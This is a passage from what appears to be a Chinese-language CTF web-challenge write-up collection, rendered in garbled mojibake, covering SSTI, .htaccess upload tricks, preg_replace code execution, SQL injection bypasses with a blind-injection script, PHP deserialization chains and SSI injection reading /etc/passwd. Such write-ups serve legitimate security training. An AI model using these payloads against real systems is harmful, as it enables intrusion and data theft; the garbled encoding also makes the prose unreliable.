¼ç»•è¿‡å’Œcatç»•è¿‡\n\n```\npayload:fl4g.php?num=2e4&md5=0e215962017&get_flag=tac${IFS}fllllllllllllllllllllllllllllllllllllllllaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaag\n```\n\n## [æŠ¤ç½‘æ¯ 2018]easy_tornado\n\nè¿›å»ä¸‰ä¸ªæ–‡ä»¶\n\n```\n/flag.txtï¼šflag in /fllllllllllllag\n/welcome.txtï¼šrender\n/hints.txtï¼šmd5(cookie_secret+md5(filename))\n```\n\nç‚¹å‡»æ–‡ä»¶æŸ¥çœ‹é“¾æ¥ä¼ å‚ï¼Œå¾ˆæ˜æ˜¾æ˜¯æ–‡ä»¶åå’Œå¯¹åº”çš„`md5(cookie_secret+md5(filename))`æ‰€ä»¥æˆ‘ä»¬éœ€è¦æ‰¾åˆ°`cookie_secret`è¿™ä¸€å˜é‡çš„å€¼ï¼Œå†çœ‹welcomeä¸­æœ‰renderï¼Œæ€€ç–‘æ˜¯SSTIï¼Œæ›´æ”¹ä¼ å‚å†…å®¹ï¼Œå‡ºç°erroré¡µé¢ï¼Œæµ‹è¯•SSTIæˆåŠŸ\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-28 22.29.11.png)\n\nåœ¨æŸ¥æ‰¾tornadoè·å–ç¯å¢ƒå˜é‡åœ¨handler.settingsä¸­ï¼Œç›´æ¥æ„é€ \n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-28 22.31.47.png)\n\nåœ¨æŒ‰ç…§hintsä¸­å†…å®¹æ„é€ hashå³å¯\n\n```\npayload:file?filename=/fllllllllllllag&filehash=da1ca88f71d944d0819a420a222fc69c\n```\n\n## [MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢\n\nApacheè§£ææ¼æ´\n\n```\n#.htaccess\n<FilesMatch \"shell.png\">\nSetHandler application/x-httpd-php\n</FilesMatch>\n```\n\nä¸Šä¼ åèšå‰‘è¿æ¥å³å¯\n\n## [BJDCTF2020]ZJCTFï¼Œä¸è¿‡å¦‚æ­¤\n\nå…ˆçœ‹ä»£ç \n\n```php\n//index.php\n<?php\nerror_reporting(0);\n$text = $_GET[\"text\"];\n$file = $_GET[\"file\"];\nif(isset($text)&&(file_get_contents($text,'r')===\"I have a dream\")){\n    echo \"<br><h1>\".file_get_contents($text,'r').\"</h1></br>\";\n    if(preg_match(\"/flag/\",$file)){\n        die(\"Not now!\");\n    }\n    include($file);  //next.php\n}\nelse{\n    highlight_file(__FILE__);\n}\n?>\n```\n\næ„é€ å…ˆè¯»å–next.phpä¸­çš„å†…å®¹\n\n```\n?file=php://filter/read=convert.base64-encode/resource=next.php&text=php://input\nPOST:\nI have a dream\n```\n\n```php\n//next.php\n<?php\n$id = $_GET['id'];\n$_SESSION['id'] = $id;\n\nfunction complex($re, $str) {\n    return preg_replace(\n        '/(' . $re . ')/ei',\n        'strtolower(\"\\\\1\")',\n        $str\n    );\n}\n\n\nforeach($_GET as $re => $str) {\n    echo complex($re, $str). \"\\n\";\n}\n\nfunction getFlag(){\n\t@eval($_GET['cmd']);\n}\n\n```\n\nè¿™æ—¶å€™è¦ç”¨ä¸€ä¸ªæ­£åˆ™çš„æ¼æ´[Preg_Replaceä»£ç æ‰§è¡Œæ¼æ´è§£æ](https://www.cesafe.com/html/6999.html)\n\næ„é€ å‡ºæ­£åˆ™å†…å®¹ä¸º\n\nre=\\S*ï¼ˆå¤šæ¬¡åŒ¹é…éç©ºå­—ç¬¦ï¼‰\n\nstr=${phpinfo()}\n\næµ‹è¯•æˆåŠŸ\n\nè¿›è€Œä½¿ç”¨getFlagå‡½æ•°æ‰§è¡Œå‘½ä»¤\n\n```\npayload:next.php?\\S*={${getFlag()}}&cmd=system('cat /flag');\n```\n\n## [De1CTF 2019]SSRF Me\n\nä¸Šæ¥å°±æ˜¯ä»£ç \n\n```python\n#! /usr/bin/env python\n# #encoding=utf-8\nfrom flask import Flask\nfrom flask import request\nimport socket\nimport hashlib\nimport urllib\nimport sys\nimport os\nimport json\n\nreload(sys)\nsys.setdefaultencoding('latin1')\n\napp = Flask(__name__)\n\nsecert_key = os.urandom(16)\n\n\nclass Task:\n    def __init__(self, action, param, sign, ip):\n        self.action = action\n        self.param = param\n        self.sign = sign\n        self.sandbox = md5(ip)\n        if (not os.path.exists(self.sandbox)):\n            os.mkdir(self.sandbox)\n\n    def Exec(self):\n        result = {}\n        result['code'] = 500\n        if (self.checkSign()):\n            if \"scan\" in self.action:\n                tmpfile = open(\"./%s/result.txt\" % self.sandbox, 'w')\n                resp = scan(self.param)\n                if (resp == \"Connection Timeout\"):\n                    result['data'] = resp\n                else:\n                    print resp\n                    tmpfile.write(resp)\n                    tmpfile.close()\n                result['code'] = 200\n            if \"read\" in self.action:\n                f = open(\"./%s/result.txt\" % self.sandbox, 'r')\n                result['code'] = 200\n                result['data'] = f.read()\n            if result['code'] == 500:\n                result['data'] = \"Action Error\"\n        else:\n            result['code'] = 500\n            result['msg'] = \"Sign Error\"\n        return result\n\n    def checkSign(self):\n        if (getSign(self.action, self.param) == self.sign):\n            return True\n        else:\n            return False\n\n\n@app.route(\"/geneSign\", methods=['GET', 'POST'])\ndef geneSign():\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    action = \"scan\"\n    return getSign(action, param)\n\n\n@app.route('/De1ta', methods=['GET', 'POST'])\ndef challenge():\n    action = urllib.unquote(request.cookies.get(\"action\"))\n    param = urllib.unquote(request.args.get(\"param\", \"\"))\n    sign = urllib.unquote(request.cookies.get(\"sign\"))\n    ip = request.remote_addr\n    if (waf(param)):\n        return \"No Hacker!!!!\"\n    task = Task(action, param, sign, ip)\n    return json.dumps(task.Exec())\n\n\n@app.route('/')\ndef index():\n    return open(\"code.txt\", \"r\").read()\n\n\ndef scan(param):\n    socket.setdefaulttimeout(1)\n    try:\n        return urllib.urlopen(param).read()[:50]\n    except:\n        return \"Connection Timeout\"\n\n\ndef getSign(action, param):\n    return hashlib.md5(secert_key + param + action).hexdigest()\n\n\ndef md5(content):\n    return hashlib.md5(content).hexdigest()\n\n\ndef waf(param):\n    check = param.strip().lower()\n    if check.startswith(\"gopher\") or check.startswith(\"file\"):\n        return True\n    else:\n        return False\n\n\nif __name__ == '__main__':\n    app.debug = False\n    app.run(host='0.0.0.0', port=9999)\n\n\n```\n\nçœ‹ä»£ç å…³é”®ç‚¹å°±æ˜¯`Task`ç±»ä¸­çš„å‡½æ•°æ‰§è¡Œï¼Œåˆ†æå¾—å‡ºåªè¦`action`ä¸­åŒæ—¶å«æœ‰scanå’Œreadå³å¯è¯»å–å‡ºæ–‡ä»¶å¹¶è¿”å›ï¼Œè€Œåœ¨`De1ta`è·¯å¾„ä¸­æœ‰åˆ›å»º`Task`ç±»çš„è¿‡ç¨‹ï¼Œ`geneSign`è·¯å¾„ä¸­å¯ä»¥è·å–signå€¼ï¼Œæ‰€ä»¥è®©`action=scanread&parma=flag.txt`ï¼Œé€šè¿‡`geneSign`è·¯å¾„è·å–signå³å¯ï¼Œ`getSign`å‡½æ•°ä¸­md5å†…å®¹çš„æ‹¼æ¥ï¼Œæ˜¯`secert_key + param + action`ï¼Œè€Œå¯¹äº`geneSign`è·¯å¾„æ¥è¯´ï¼Œactionæ°¸è¿œä¸ºscanï¼Œæ‰€ä»¥geneSignç»“æœå°±æ˜¯`secert_key + param + 'scan'`æ‹¼æ¥å‡ºå¸¦æœ‰åŒæ—¶å¸¦æœ‰scanå’Œreadåªè¦è®©`param=flag.txtread`å³å¯ï¼Œä¼ å…¥`geneSign`æ‹¿åˆ°signå€¼\n\n![](https://jlan-blog.oss-cn-beijing.aliyuncs.com/æˆªå±2022-04-29 15.50.50.png)\n\næœ€ç»ˆpayloadå¦‚ä¸‹\n\n```\npayload:De1ta?param=flag.txt\nCookie: action=readscan;sign=1983e9273c0ae452b67ccecb2fb88ed2;\n```\n\n## [ç½‘é¼æ¯ 2020 æœ±é›€ç»„]Nmap\n\nè¯¦è§è¯¥é¢˜ï¼š[BUUCTF 2018]Online Tool\n\n\n\n## [SWPU2019]Web1\n\næ˜¯SQLæ³¨å…¥\n\n1ã€ç©ºæ ¼è¿‡æ»¤\n\n2ã€æ³¨é‡Šç¬¦è¿‡æ»¤\n\n3ã€[information_schemaç»•è¿‡](https://www.anquanke.com/post/id/193512)\n\n4ã€æ— åˆ—åæ³¨å…¥\n\nç¬¬ä¸€ä¸ªç”¨/**/ç»•è¿‡å°±è¡Œ\n\nç¬¬äºŒä¸ªæœ«å°¾åŠ å•å¼•å·é—­åˆå°±è¡Œ\n\næœ€åä¸€ä¸ªä½¿ç”¨innodbå¼•æ“ç»•è¿‡\n\næ¡ä»¶æ˜¯MySQLç‰ˆæœ¬>5.5\n\nè¡¨ååœ¨innodb_table_stats\n\nåˆ—ååœ¨innodb_table_index\n\nselect table_name from mysql.innodb_table_stats where database_name=database()\n\né¦–å…ˆæ˜¯æµ‹è¯•åˆ—æ•°ï¼Œä¸º22åˆ—ï¼Œå›æ˜¾åœ¨2ï¼Œ3ä½ï¼Œç„¶åçˆ†è¡¨å\n\n```\n-1'/**/union/**/select/**/1,(select/**/group_concat(table_name)from(mysql.innodb_table_stats)where(database_name=database())),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'\n```\n\nè¡¨åï¼šadsï¼Œusers\n\næ— åˆ—åæ³¨å…¥\n\n```text\nselect 1,2,3 union select * from admin;\n```\n\nè¿™æ ·çš„è¯union selectçš„å†…å®¹å°±æ˜¯å‰ä¸‰åˆ—çš„å†…å®¹\n\n```text\nselect `3` from (select 1,2,3 union select * from admin)a;\n```\n\næˆ–è€…\n\n```\nselect b from (select 1,2,3 as b union select * from admin)a;\n```\n\nè¿™æ ·å°±æ˜¯ç¬¬ä¸‰åˆ—çš„å†…å®¹\n\n```\npayload:-1'/**/union/**/select/**/1,(select/**/group_concat(b)from(select/**/1,2,3/**/as/**/b/**/union/**/select/**/*/**/from/**/users)a),3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22'\n```\n\n## [MRCTF2020]Ezpop\n\n```PHP\nWelcome to index.php\n<?php\n//flag is in flag.php\n//WTF IS THIS?\n//Learn From https://ctf.ieki.xyz/library/php.html#%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95\n//And Crack It!\nclass Modifier {\n    protected $var;\n    public function append($value){\n        include($value);\n    }\n    public function __invoke(){\n        $this->append($this->var);\n    }\n}\nclass Show{\n    public $source;\n    public $str;\n    public function __construct($file='index.php'){\n        $this->source = $file;\n        echo 'Welcome to '.$this->source.\"<br>\";\n    }\n    public function __toString(){\n        return $this->str->source;\n    }\n    public function __wakeup(){\n        if(preg_match(\"/gopher|http|file|ftp|https|dict|\\.\\./i\", $this->source)) {\n            echo \"hacker\";\n            $this->source = \"index.php\";\n        }\n    }\n}\nclass Test{\n    public $p;\n    public function __construct(){\n        $this->p = array();\n    }\n\n    public function __get($key){\n        $function = $this->p;\n        return $function();\n    }\n}\n\nif(isset($_GET['pop'])){\n    @unserialize($_GET['pop']);\n}\nelse{\n    $a=new Show;\n    highlight_file(__FILE__);\n}\n?>\n```\n\nååºåˆ—åŒ–ä¸ç”¨å¤šè¯´ï¼Œæœ€ååº”è¯¥æ–‡ä»¶åŒ…å«åŠ PHPä¼ªåè®®è¯»å–ï¼Œæ‰¾é“¾å­\n\n`__invoke`éœ€è¦ä»¥å‡½æ•°è°ƒç”¨ç±»ï¼Œåœ¨Testçš„`__get`æ–¹æ³•ä¸­ï¼Œ`__get`æ–¹æ³•åœ¨Showä¸­`__toString`è°ƒç”¨ç±»ä¸­ä¸å­˜åœ¨çš„æ–¹æ³•æ—¶ä¼šè¢«è°ƒç”¨ï¼Œæœ€ç»ˆæ„é€ å‡ºçš„å°±æ˜¯\n\n```PHP\n<?php\nclass Modifier{\n    protected $var = 'php://filter/read=convert.base64-encode/resource=flag.php';\n}\nclass Show{\n    public $source;\n    public $str;\n    public function __construct($file)\n    {\n        $this->source = $file;\n    }\n    public function __toString(){\n        return \"output anything you want\";\n    }\n}\nclass Test{\n    public $p;\n}\n$payload = new Show('test');\n$payload->str = new Test();\n$payload->str->p = new Modifier();\n$hack = new Show($payload);\necho urlencode(serialize($hack));\n?>\n```\n\nå†…å®¹base64è§£ç å³å¯\n\n## [NPUCTF2020]ReadlezPHP\n\næŸ¥çœ‹æºä»£ç ï¼Œå‘ç°äº†æ—¶é—´æ˜¾ç¤ºæ‰€ä½¿ç”¨çš„./time.php?source\n\n```PHP\n<?php\n#error_reporting(0);\nclass HelloPhp\n{\n    public $a;\n    public $b;\n    public function __construct(){\n        $this->a = \"Y-m-d h:i:s\";\n        $this->b = \"date\";\n    }\n    public function __destruct(){\n        $a = $this->a;\n        $b = $this->b;\n        echo $b($a);\n    }\n}\n$c = new HelloPhp;\n\nif(isset($_GET['source']))\n{\n    highlight_file(__FILE__);\n    die(0);\n}\n\n@$ppp = unserialize($_GET[\"data\"]);\n?>\n```\n\nååºåˆ—åŒ–æ„é€ å‡ºä»¥bä¸ºå‡½æ•°åï¼Œä»¥aä¸ºå‚æ•°çš„å‡½æ•°æ‰§è¡Œå³å¯ï¼Œå°è¯•systemå‘ç°æ²¡æœ‰å›æ˜¾ï¼Œå¯èƒ½æ˜¯è¢«è¿‡æ»¤ï¼Œå†å°è¯•evalï¼Œä¹Ÿè¢«è¿‡æ»¤ï¼Œæ”¾å¼ƒæ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œå°è¯•æ‰§è¡Œphpå‡½æ•°ï¼Œä½¿ç”¨assertåŒ…è£¹phpinfo()ï¼ŒæŸ¥æ‰¾flagæˆåŠŸ\n\n## [CISCN2019 åä¸œå—èµ›åŒº]Web11\n\nåœ¨XFFä½ç½®å°è¯•SSTIæˆåŠŸï¼Œè¾“å…¥{{config}}æŠ¥é”™å‘ç°ä½¿ç”¨çš„æ˜¯smartyæ¸²æŸ“ï¼Œ{system('ls /')}å‘ç°flagï¼Œ{system('cp /flag /var/www/html/flag.txt')}å°†æ–‡ä»¶å¸¦å‡ºå³å¯\n\n## [æå®¢å¤§æŒ‘æˆ˜ 2019]FinalSQL\n\nç‚¹æç¤ºå‘ç°æ³¨å…¥ç‚¹ï¼Œè¿‡æ»¤äº†ç©ºæ ¼ï¼Œè¿˜æ˜¯æ•°å­—å‹æ³¨å…¥ï¼Œä½¿ç”¨å¸ƒå°”ç›²æ³¨\n\n```\nçˆ†åº“åï¼š\nid=2^(ascii(substr((select(database())),{i},1))={ord(j)})\næ­£ç¡®è¿”å›3ï¼Œé”™è¯¯è¿”å›2\nçˆ†è¡¨å\nid=2^(ascii(substr((select(group_concat(table_name))from(information_schema.tables)where(table_schema='geek')),{i},1))={ord(j)})\nçˆ†åˆ—å\nid=2^(ascii(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name='F1naI1y')),{i},1))={ord(j)})\n```\n\næœ€ç»ˆpayloadè„šæœ¬\n\n```python\nimport requests\nurl=\"http://93af0548-22e2-4a84-8fd6-3a78dfdda8f3.node4.buuoj.cn:81/search.php\"\nname=\",QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890\"\nflag=\"flag{1234567890-bcde},\"\nfor i in range(1,100):\n    for j in flag:\n        parma={\n            'id':f\"2^(ascii(substr((select(group_concat(password))from(F1naI1y)where(username='flag')),{i},1))={ord(j)})\"\n        }\n        tex=requests.get(url,params=parma).text\n        if \"Ohhh You find the flag read on!\" in tex:\n            print(j,end='')\n            break\n```\n\n## [0CTF 2016]piapiapia\n\næ²¡å•¥å†…å®¹å…ˆæ‰«ç›®å½•ï¼Œwww.zipæ‰«å‡ºæºç ï¼Œå‘ç°æœ‰éšè—çš„æ³¨å†Œé¡µé¢ï¼Œå…ˆè¿›è¡Œæ³¨å†Œå’Œç™»å½•ï¼Œç„¶åå†æŸ¥çœ‹æºç \n\n```PHP\nindex.phpå’Œregister.phpä¸€ä¸ªç™»å½•ä¸€ä¸ªæ³¨å†Œ\nclass.phpå…³é”®å‡½æ•°\npublic function filter($string) {\n\t$escape = array('\\'', '\\\\\\\\');\n\t$escape = '/' . implode('|', $escape) . '/';\n\t$string = preg_replace($escape, '_', $string);\n\t$safe = array('select', 'insert', 'update', 'delete', 'where');\n\t$safe = '/' . implode('|', $safe) . '/i';\n\treturn preg_replace($safe, 'hacker', $string);\n}\nupdate.phpæ›´æ–°ä¸ªäººä¿¡æ¯å†…å®¹\nif($_POST['phone'] && $_POST['email'] && $_POST['nickname'] && $_FILES['photo']) {\n\t$username = $_SESSION['username'];\n\tif(!preg_match('/^\\d{11}$/', $_POST['phone']))\n\t\tdie('Invalid phone');\n\n\tif(!preg_match('/^[_a-zA-Z0-9]{1,10}@[_a-zA-Z0-9]{1,10}\\.[_a-zA-Z0-9]{1,10}$/', $_POST['email']))\n\t\tdie('Invalid email');\n\t\n\tif(preg_match('/[^a-zA-Z0-9_]/', $_POST['nickname']) || strlen($_POST['nickname']) > 10)\n\t\tdie('Invalid nickname');\n\n\t$file = $_FILES['photo'];\n\tif($file['size'] < 5 or $file['size'] > 1000000)\n\t\tdie('Photo size error');\n\n\tmove_uploaded_file($file['tmp_name'], 'upload/' . md5($file['name']));\n\t$profile['phone'] = $_POST['phone'];\n\t$profile['email'] = $_POST['email'];\n\t$profile['nickname'] = $_POST['nickname'];\n\t$profile['photo'] = 'upload/' . md5($file['name']);\n\t$user->update_profile($username, serialize($profile));\n\techo 'Update Profile Success!<a href=\"profile.php\">Your Profile</a>';\n}\nprofile.php\n$profile = unserialize($profile);\n$phone = $profile['phone'];\t\t\n$email = $profile['email'];\n$nickname = $profile['nickname'];\n$photo = base64_encode(file_get_contents($profile['photo']));//å…³é”®ï¼Œå¦‚æœå…¶ä¸­photoæ–‡ä»¶åæ˜¯config.phpå³å¯è¯»å–åˆ°flag\n```\n\nååºåˆ—åŒ–å­—ç¬¦é€ƒé€¸æ¼æ´ï¼š\n\n```\nåŸå§‹åºåˆ—åŒ–å­—ç¬¦ä¸²ï¼š\na:1:{s:5:\"phone\";s:5:\"where\";}\næ­¤æ—¶è¯»å–åˆ°çš„å†…å®¹æ˜¯phone=where\nå°†å­—ç¬¦ä¸²è¿›è¡Œè¿‡æ»¤ï¼Œpreg_replace('where', 'hacker', $string);\nåºåˆ—åŒ–åå­—ç¬¦ä¸²å˜ä¸º\na:1:{s:5:\"phone\";s:5:\"hacker\";}\næ­¤æ—¶ååºåˆ—åŒ–åªè¯»å–å‰5ä½ï¼Œhackeï¼Œåé¢çš„rå°±å±äºé€ƒé€¸çš„å­—ç¬¦äº†ï¼Œé‚£ä¹ˆå¦‚æœæˆ‘ä»¬æ„é€ å‡ºä¸€ä¸ªèƒ½é€ƒé€¸è¶³å¤Ÿé•¿çš„å­—ç¬¦çš„å­—ç¬¦ä¸²ï¼Œå°±å¯ä»¥è®©åºåˆ—åŒ–åçš„å­—ç¬¦ä¸²å­˜å…¥æˆ‘ä»¬éœ€è¦çš„å†…å®¹ï¼Œåœ¨æœ¬é¢˜ä¸­æˆ‘ä»¬æƒ³è¦ä¼ å…¥çš„æ˜¯s:5:\"photo\";s:10:\"config.php\";}ï¼Œè€Œåˆå› ä¸ºæˆ‘ä»¬éœ€è¦å¯¹nicknameçš„å†…å®¹è¿›è¡Œç»•è¿‡ï¼Œæ­¤æ—¶nicknameæ˜¯ä¸€ä¸ªæ•°ç»„æ‰€ä»¥æˆ‘ä»¬æœ€ç»ˆéœ€è¦é€ƒé€¸çš„å­—ç¬¦ä¸²å°±æ˜¯\"}s:5:\"photo\";s:10:\"config.php\";}ï¼Œæ‰€ä»¥æœ€åæ„é€ payloadä½¿ç”¨å…³é”®å­—whereï¼Œæ›¿æ¢ä¸ºhackeråèƒ½æº¢å‡ºï¼Œä¸Šé¢å­—ç¬¦ä¸²æœ‰34ä¸ªå­—ç¬¦é‚£ä¹ˆæˆ‘ä»¬ä¼ å…¥34ä¸ªwhere+å­—ç¬¦ä¸²å³å¯\n```\n\npayload\n\n```\nnickname[]=wherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewherewhere\";}s:5:\"photo\";s:10:\"config.php\";}\n```\n\n## [BJDCTF2020]EasySearch\n\næ‰«æï¼Œå¾—åˆ°index.php.swp\n\n```PHP\n<?php\n\tob_start();\n\tfunction get_hash(){\n\t\t$chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()+-';\n\t\t$random = $chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)].$chars[mt_rand(0,73)];//Random 5 times\n\t\t$content = uniqid().$random;\n\t\treturn sha1($content); \n\t}\n    header(\"Content-Type: text/html;charset=utf-8\");\n\t***\n    if(isset($_POST['username']) and $_POST['username'] != '' )\n    {\n        $admin = '6d0bc1';\n        if ( $admin == substr(md5($_POST['password']),0,6)) {\n            echo \"<script>alert('[+] Welcome to manage system')</script>\";\n            $file_shtml = \"public/\".get_hash().\".shtml\";\n            $shtml = fopen($file_shtml, \"w\") or die(\"Unable to open file!\");\n            $text = '\n            ***\n            ***\n            <h1>Hello,'.$_POST['username'].'</h1>\n            ***\n\t\t\t***';\n            fwrite($shtml,$text);\n            fclose($shtml);\n            ***\n\t\t\techo \"[!] Header  error ...\";\n        } else {\n            echo \"<script>alert('[!] Failed')</script>\";\n            \n    }else\n    {\n\t***\n    }\n\t***\n?>\n```\n\nè¦æ±‚passwordç»è¿‡md5å¤„ç†åå‰å…­ä½æ˜¯6d0bc1\n\nè´´ä¸€ä¸ªçˆ†ç ´çš„è„šæœ¬\n\n```python\nimport hashlib\nfor i in range(1000000000):\n    a = hashlib.md5(str(i).encode('utf-8')).hexdigest()\n    if a[0:6] == '6d0bc1':\n        print(i)\n        print(a)\n```\n\næŠ“åŒ…å‘ç°å“åº”å¤´ä¸­\n\n```\nUrl_is_here: public/11b26335b1b3d0a88c6ec7333d2f5f522d1237f2.shtml\n```\n\nè®¿é—®å°è¯•XFF SSTIå¤±è´¥ï¼Œçœ‹çœ‹wpå§ï¼Œæ˜¯SSIæ³¨å…¥æ¼æ´\n\n```\nSSI æ³¨å…¥å…¨ç§°Server-Side Includes Injectionï¼Œå³æœåŠ¡ç«¯åŒ…å«æ³¨å…¥ã€‚SSI æ˜¯ç±»ä¼¼äº CGIï¼Œç”¨äºåŠ¨æ€é¡µé¢çš„æŒ‡ä»¤ã€‚SSI æ³¨å…¥å…è®¸è¿œç¨‹åœ¨ Web åº”ç”¨ä¸­æ³¨å…¥è„šæœ¬æ¥æ‰§è¡Œä»£ç ã€‚\n\nSSIæ˜¯åµŒå…¥HTMLé¡µé¢ä¸­çš„æŒ‡ä»¤ï¼Œåœ¨é¡µé¢è¢«æä¾›æ—¶ç”±æœåŠ¡å™¨è¿›è¡Œè¿ç®—ï¼Œä»¥å¯¹ç°æœ‰HTMLé¡µé¢å¢åŠ åŠ¨æ€ç”Ÿæˆçš„å†…å®¹ï¼Œè€Œæ— é¡»é€šè¿‡CGIç¨‹åºæä¾›å…¶æ•´ä¸ªé¡µé¢ï¼Œæˆ–è€…ä½¿ç”¨å…¶ä»–åŠ¨æ€æŠ€æœ¯ã€‚\n\nä»æŠ€æœ¯è§’åº¦ä¸Šæ¥è¯´ï¼ŒSSIå°±æ˜¯åœ¨HTMLæ–‡ä»¶ä¸­ï¼Œå¯ä»¥é€šè¿‡æ³¨é‡Šè¡Œè°ƒç”¨çš„å‘½ä»¤æˆ–æŒ‡é’ˆï¼Œå³å…è®¸é€šè¿‡åœ¨HTMLé¡µé¢æ³¨å…¥è„šæœ¬æˆ–è¿œç¨‹æ‰§è¡Œä»»æ„ä»£ç ã€‚\n```\n\né¦–å…ˆï¼Œä»‹ç»ä¸‹SHTMLï¼Œåœ¨SHTMLæ–‡ä»¶ä¸­ä½¿ç”¨SSIæŒ‡ä»¤å¼•ç”¨å…¶ä»–çš„htmlæ–‡ä»¶ï¼ˆ#includeï¼‰ï¼Œæ­¤æ—¶æœåŠ¡å™¨ä¼šå°†SHTMLä¸­åŒ…å«çš„SSIæŒ‡ä»¤è§£é‡Šï¼Œå†ä¼ é€ç»™å®¢æˆ·ç«¯ï¼Œæ­¤æ—¶çš„HTMLä¸­å°±ä¸å†æœ‰SSIæŒ‡ä»¤äº†ã€‚æ¯”å¦‚è¯´æ¡†æ¶æ˜¯å›ºå®šçš„ï¼Œä½†æ˜¯é‡Œé¢çš„æ–‡ç« ï¼Œå…¶ä»–èœå•ç­‰å³å¯ä»¥ç”¨#includeå¼•ç”¨è¿›æ¥ã€‚\n\n**â‘ æ˜¾ç¤ºæœåŠ¡å™¨ç«¯ç¯å¢ƒå˜é‡<#echo>**\n\næœ¬æ–‡æ¡£åç§°ï¼š\n\n`<!â€“#echo var=\"DOCUMENT_NAME\"â€“>`\n\nç°åœ¨æ—¶é—´ï¼š\n\n`<!â€“#echo var=\"DATE_LOCAL\"â€“>`\n\næ˜¾ç¤ºIPåœ°å€ï¼š\n\n`<! #echo var=\"REMOTE_ADDR\"â€“>`\n\n**â‘¡å°†æ–‡æœ¬å†…å®¹ç›´æ¥æ’å…¥åˆ°æ–‡æ¡£ä¸­<#include>**\n\n`<! #include file=\"æ–‡ä»¶åç§°\"â€“>`\n\n`<!--#include virtual=\"index.html\" -->`\n\n`<! #include virtual=\"æ–‡ä»¶åç§°\"â€“>`\n\n`<!--#include virtual=\"/www/footer.html\" -->`\n\næ³¨ï¼šfileåŒ…å«æ–‡ä»¶å¯ä»¥åœ¨åŒä¸€çº§ç›®å½•æˆ–å…¶å­ç›®å½•ä¸­ï¼Œä½†ä¸èƒ½åœ¨ä¸Šä¸€çº§ç›®å½•ä¸­ï¼ŒvirtualåŒ…å«æ–‡ä»¶å¯ä»¥æ˜¯Webç«™ç‚¹ä¸Šçš„è™šæ‹Ÿç›®å½•çš„å®Œæ•´è·¯å¾„\n\n**â‘¢æ˜¾ç¤ºWEBæ–‡æ¡£ç›¸å…³ä¿¡æ¯<#flastmod><#fsize>(å¦‚æ–‡ä»¶åˆ¶ä½œæ—¥æœŸ/å¤§å°ç­‰)**\n\næ–‡ä»¶æœ€è¿‘æ›´æ–°æ—¥æœŸï¼š\n\n`<! #flastmod file=\"æ–‡ä»¶åç§°\"â€“>`\n\næ–‡ä»¶çš„é•¿åº¦ï¼š\n\n`<!â€“#fsize file=\"æ–‡ä»¶åç§°\"â€“>`\n\n**â‘£ç›´æ¥æ‰§è¡ŒæœåŠ¡å™¨ä¸Šçš„å„ç§ç¨‹åº<#exec>(å¦‚CGIæˆ–å…¶ä»–å¯æ‰§è¡Œç¨‹åº)**\n\n`<!â€“#exec cmd=\"æ–‡ä»¶åç§°\"â€“>`\n\n`<!--#exec cmd=\"cat /etc/passwd\"-->`\n\n`<!â€“#exec cgi=\"æ–‡ä»¶åç§°\"â€“>`\n\n`<!--#exec cgi=\"/cgi-bin/access_log.cgi\"â€“>`\n\nå°†æŸä¸€å¤–éƒ¨ç¨‹åºçš„è¾“å‡ºæ’å…¥åˆ°é¡µé¢ä¸­ã€‚å¯æ’å…¥CGIç¨‹åºæˆ–è€…æ˜¯å¸¸è§„åº”ç”¨ç¨‹åºçš„è¾“å…¥ï¼Œè¿™å–å†³äºä½¿ç”¨çš„å‚æ•°æ˜¯cmdè¿˜æ˜¯cgiã€‚\n\n**â‘¤è®¾ç½®SSIä¿¡æ¯æ˜¾ç¤ºæ ¼å¼<#config>(å¦‚æ–‡ä»¶åˆ¶ä½œæ—¥æœŸ/å¤§å°æ˜¾ç¤ºæ–¹å¼**)\n\n**â‘¥é«˜çº§SSIå¯è®¾ç½®å˜é‡ä½¿ç”¨ifæ¡ä»¶è¯­å¥ã€‚**\n\næ‰€ä»¥æˆ‘ä»¬ä¼ å…¥`<!â€“#exec cmd=\"ç³»ç»Ÿå‘½ä»¤\"â€“>`å³å¯æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ï¼Œpasswordå†…å®¹å·²ç¡®å®šï¼Œåªèƒ½é€šè¿‡usernameä¼ å…¥\n\n```\npayload:\nPOST\nusername=<!--#exec cmd=\"cat ../flag_990c66bf85a09c664f0b6741840499b2\"-->&password=2020666\n```\n\n## [GYCTF2020]FlaskApp\n\nè§£å¯†å¤„SSTI\n\nè¿‡æ»¤äº†*ï¼Œsystemï¼Œos\n\nè¯•è¯•è¯»å–æ–‡ä»¶æºç ï¼Œæ‰¾åˆ°äº†é»‘åå•\n\n`black_list = [\"flag\",\"os\",\"system\",\"popen\",\"import\",\"eval\",\"chr\",\"request\", \"subprocess\",\"commands\",\"socket\",\"hex\",\"base64\",\"*\",\"?\"]`\n\nä½¿ç”¨åŠ å·ç»•è¿‡ï¼Œéå†æ ¹ç›®å½•\n\n`{{url_for.__globals__[\"o\"+\"s\"].listdir('/')}}`\n\nå‘ç°`this_is_the_flag.txt`æ–‡ä»¶\n\n`{{url_for.__globals__['__builtins__'].open('/this_is_the_f' + 'lag.txt','r').read()}}`\n\næ‹¿åˆ°flag\n\n## [BSidesCF 2019]Kookie\n\n```\nCookie: username=admin\n```\n\n## [æå®¢å¤§æŒ‘æˆ˜ 2019]RCE ME\n\n```php\n<?php\nerror_reporting(0);\nif(isset($_GET['code'])){\n\t$code=$_GET['code'];\n\tif(strlen($code)>40){\n\t\tdie(\"This is too 